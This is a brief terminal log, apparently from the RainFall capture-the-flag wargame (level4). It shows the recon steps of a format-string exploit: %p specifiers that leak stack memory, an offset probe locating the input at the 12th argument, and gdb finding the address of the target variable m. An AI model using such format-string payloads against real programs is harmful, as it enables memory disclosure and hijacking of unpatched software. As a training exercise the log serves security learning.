```
level4@RainFall:~$ ./level4 
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p   
AAAA 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff540 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
```

```
level4@RainFall:~$ ./level4 
AAAA%12$p
AAAA0x41414141
```

```
level4@RainFall:~$ gdb -q level4 
Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
(gdb) p &m
$1 = (<data variable, no debug info> *) 0x8049810
(gdb) 
```



